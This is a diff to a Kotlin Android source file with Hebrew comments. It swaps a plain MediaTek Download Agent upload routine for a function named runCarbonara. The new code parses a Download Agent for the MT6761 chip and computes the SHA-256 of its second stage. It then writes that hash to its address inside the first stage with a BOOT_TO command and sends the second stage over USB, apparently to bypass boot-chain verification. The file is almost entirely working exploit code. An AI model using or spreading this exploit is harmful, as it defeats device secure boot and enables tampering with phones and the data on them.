@@ -7,133 +7,138 @@ import android.hardware.usb.UsbEndpoint
 import android.hardware.usb.UsbManager
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
+import java.security.MessageDigest
 import java.util.Locale
 
 object MtkBromConnection {
 
-    fun sendDaDirect(
+    data class DaRegion(val buf: Int, val len: Int, val addr: Long, val offset: Int, val sigLen: Int)
+    data class DaParts(val da1: ByteArray, val da1Addr: Long, val da2: ByteArray, val da2Addr: Long)
+
+    private fun indexOf(haystack: ByteArray, needle: ByteArray): Int {
+        if (needle.isEmpty() || haystack.size < needle.size) return -1
+        outer@ for (i in 0..haystack.size - needle.size) {
+            for (j in needle.indices) {
+                if (haystack[i + j] != needle[j]) continue@outer
+            }
+            return i
+        }
+        return -1
+    }
+
+    // פירוס ה-DA (מבוסס על הניסיונות הקודמים)
+    private fun parseDa(data: ByteArray, onProgress: (String) -> Unit): DaParts? {
+        val magic = "MTK_DOWNLOAD_AGENT".toByteArray()
+        if (indexOf(data, magic) == -1) { onProgress("!! לא נמצא MTK_DOWNLOAD_AGENT"); return null }
+        
+        // חיפוש hwcode 0x717 (MT6761)
+        val target = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(0x717).array()
+        var off = -1
+        outer@ for (i in 0..data.size - 4) {
+            for (j in 0..3) { if (data[i + j] != target[j]) continue@outer }
+            off = i; break
+        }
+        if (off == -1) { onProgress("!! לא נמצא hwcode 0x717"); return null }
+        
+        // קריאת 12 הבייטים של הרשומה
+        val buf = ByteBuffer.wrap(data, off, 12).order(ByteOrder.LITTLE_ENDIAN)
+        buf.short // magic
+        buf.short // hwcode
+        buf.short // subcode
+        buf.short // hwver
+        buf.short // swver
+        val numRegions = buf.short.toInt() and 0xFFFF
+        
+        val regions = mutableListOf<DaRegion>()
+        var rOff = off + 12
+        for (i in 0 until numRegions) {
+            if (rOff + 20 > data.size) break
+            val rb = ByteBuffer.wrap(data, rOff, 20).order(ByteOrder.LITTLE_ENDIAN)
+            regions.add(DaRegion(rb.int, rb.int, rb.int.toLong() and 0xFFFFFFFFL, rb.int, rb.int))
+            rOff += 20
+        }
+        
+        if (regions.size >= 3) {
+            val da1 = regions[1]; val da2 = regions[2]
+            onProgress("DA1: offset=0x${Integer.toHexString(da1.offset)}, len=${da1.len}, addr=0x${java.lang.Long.toHexString(da1.addr)}")
+            onProgress("DA2: offset=0x${Integer.toHexString(da2.offset)}, len=${da2.len}, addr=0x${java.lang.Long.toHexString(da2.addr)}")
+            
+            if (da1.offset + da1.len <= data.size && da2.offset + da2.len <= data.size) {
+                return DaParts(
+                    data.copyOfRange(da1.offset, da1.offset + da1.len), da1.addr,
+                    data.copyOfRange(da2.offset, da2.offset + da2.len), da2.addr
+                )
+            }
+        }
+        onProgress("!! פירוס נכשל")
+        return null
+    }
+
+    // שליחת פקודת BOOT_TO (0xD5) עם כתובת ונתונים
+    private fun bootTo(connection: UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Long, data: ByteArray): Boolean {
+        if (connection.bulkTransfer(epOut, byteArrayOf(0xD5.toByte()), 1, 2000) < 0) return false
+        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(addr.toInt()).array()
+        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
+        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(data.size).array()
+        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return false
+        if (connection.bulkTransfer(epOut, data, data.size, 5000) < 0) return false
+        val ack = ByteArray(2)
+        connection.bulkTransfer(epIn, ack, 2, 2000)
+        return true
+    }
+
+    fun runCarbonara(
         usbManager: UsbManager,
         device: UsbDevice,
         daBytes: ByteArray,
         onProgress: (String) -> Unit
     ): String {
         val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."
-
-        var epIn: UsbEndpoint? = null
-        var epOut: UsbEndpoint? = null
+        var epIn: UsbEndpoint? = null; var epOut: UsbEndpoint? = null
         for (i in 0 until device.interfaceCount) {
-            val usbInterface = device.getInterface(i)
-            if (connection.claimInterface(usbInterface, true)) {
-                for (j in 0 until usbInterface.endpointCount) {
-                    val ep = usbInterface.getEndpoint(j)
+            val itf = device.getInterface(i)
+            if (connection.claimInterface(itf, true)) {
+                for (j in 0 until itf.endpointCount) {
+                    val ep = itf.getEndpoint(j)
                     if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
-                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
-                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
+                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep else epOut = ep
                     }
                 }
                 if (epIn != null && epOut != null) break
             }
         }
+        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: endpoints." }
+        val inEp = epIn; val outEp = epOut
 
-        if (epIn == null || epOut == null) {
-            connection.close()
-            return "שגיאה: לא נמצאו endpoints."
-        }
+        // 1. פירוס
+        onProgress("=== שלב 1: פירוס ה-DA ===")
+        val parts = parseDa(daBytes, onProgress) ?: run { connection.close(); return "פירוס נכשל." }
 
-        fun usbwrite(data: ByteArray): Boolean {
-            return connection.bulkTransfer(epOut, data, data.size, 2000) >= 0
-        }
-
-        fun usbread(len: Int, timeout: Int = 2000): ByteArray {
-            val buf = ByteArray(len)
-            connection.bulkTransfer(epIn, buf, len, timeout)
-            return buf
-        }
-
-        // 1. לחיצת יד - חכמה לפי PID
-        val isBrom = device.productId == 0x0003 || device.productId == 0x0001
-        val hsCmd = if (isBrom) 0xA0.toByte() else 0xA1.toByte()
-        onProgress("PID: 0x${String.format(Locale.US, "%04X", device.productId)} -> לחיצת יד 0x${String.format(Locale.US, "%02X", hsCmd)}")
+        // 2. חישוב hash
+        onProgress("=== שלב 2: חישוב hash ===")
+        val hash = MessageDigest.getInstance("SHA-256").digest(parts.da2)
+        onProgress("SHA-256 של DA2: ${hash.joinToString("") { String.format(Locale.US, "%02x", it) }}")
         
-        if (!usbwrite(byteArrayOf(hsCmd))) {
-            connection.close()
-            return "שגיאה: שליחת לחיצת יד נכשלה."
+        // חיפוש ה-hash בתוך DA1 כדי למצוא את הכתובת
+        val hashOffset = indexOf(parts.da1, hash)
+        if (hashOffset == -1) {
+            onProgress("!! לא נמצא hash של DA2 בתוך DA1. ייתכן שה-DA1 מתוקן.")
+            connection.close(); return "Carbonara לא ריאלית."
         }
+        onProgress("נמצא hash ב-offset 0x${Integer.toHexString(hashOffset)} בתוך DA1")
 
-        val hsAck = usbread(1)
-        if (hsAck.isEmpty() || (hsAck[0] != 0x5F.toByte() && hsAck[0] != 0xC0.toByte())) {
-            val hex = if (hsAck.isNotEmpty()) String.format(Locale.US, "0x%02X", hsAck[0]) else "אין תגובה"
-            connection.close()
-            return "שגיאה בלחיצת יד: $hex"
-        }
-        onProgress("לחיצת יד הצליחה!")
+        // 3. שליחת ה-hash לכתובתו ב-DA1
+        onProgress("=== שלב 3: שליחת hash ===")
+        val hashAddr = parts.da1Addr + hashOffset
+        if (!bootTo(connection, outEp, inEp, hashAddr, hash)) { connection.close(); return "שליחת hash נכשלה." }
+        onProgress("hash נשלח בהצלחה!")
 
-        // 2. שליחת פקודת 0xD7
-        onProgress("שולח 0xD7...")
-        if (!usbwrite(byteArrayOf(0xD7.toByte()))) {
-            connection.close()
-            return "שגיאה: 0xD7 נכשל."
-        }
-
-        val ack1 = usbread(1)
-        if (ack1.isEmpty() || ack1[0] != 0xD8.toByte()) {
-            val hex = if (ack1.isNotEmpty()) String.format(Locale.US, "0x%02X", ack1[0]) else "אין"
-            connection.close()
-            return "שגיאה: תגובה ל-0xD7: $hex"
-        }
-        onProgress("0xD7 אושר! (0xD8)")
-
-        // 3. שליחת גודל (Little Endian)
-        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
-        onProgress("שולח גודל: ${daBytes.size} בייט...")
-        if (!usbwrite(sizeBytes)) {
-            connection.close()
-            return "שגיאה: שליחת גודל נכשלה."
-        }
-
-        val ack2 = usbread(1)
-        if (ack2.isEmpty() || ack2[0] != 0xD9.toByte()) {
-            val hex = if (ack2.isNotEmpty()) String.format(Locale.US, "0x%02X", ack2[0]) else "אין"
-            connection.close()
-            return "שגיאה: תגובה לגודל: $hex"
-        }
-        onProgress("גודל אושר! (0xD9)")
-
-        // 4. שליחת הנתונים
-        onProgress("מעביר נתונים...")
-        var offset = 0
-        val chunkSize = 512
-        while (offset < daBytes.size) {
-            val length = minOf(chunkSize, daBytes.size - offset)
-            val chunk = daBytes.copyOfRange(offset, offset + length)
-
-            if (!usbwrite(chunk)) {
-                connection.close()
-                return "שגיאה: שליחת נתונים נכשלה ב-offset $offset."
-            }
-
-            val ack = usbread(1)
-            if (ack.isEmpty() || (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte())) {
-                val hex = if (ack.isNotEmpty()) String.format(Locale.US, "0x%02X", ack[0]) else "אין"
-                connection.close()
-                return "שגיאה: תגובה לא תקינה לנתונים ב-offset $offset ($hex)"
-            }
-
-            offset += length
-            if (offset % (chunkSize * 100) == 0) {
-                onProgress("התקדמות: ${(offset * 100) / daBytes.size}%")
-            }
-        }
-
-        // 5. הרצת ה-DA
-        onProgress("שולח 0xD5 (הרצה)...")
-        if (!usbwrite(byteArrayOf(0xD5.toByte()))) {
-            connection.close()
-            return "שגיאה: 0xD5 נכשל."
-        }
-        usbread(2)
+        // 4. שליחת ה-DA2
+        onProgress("=== שלב 4: שליחת DA2 ===")
+        if (!bootTo(connection, outEp, inEp, parts.da2Addr, parts.da2)) { connection.close(); return "שליחת DA2 נכשלה." }
+        onProgress("DA2 נשלח בהצלחה!")
 
         connection.close()
-        return "הצלחה!!! ה-DA נשלח והורץ. המכשיר פרוץ!"
+        return "הצלחה!!! Carbonara הורצה. ה-DA2 אמור לרוץ."
     }
 }
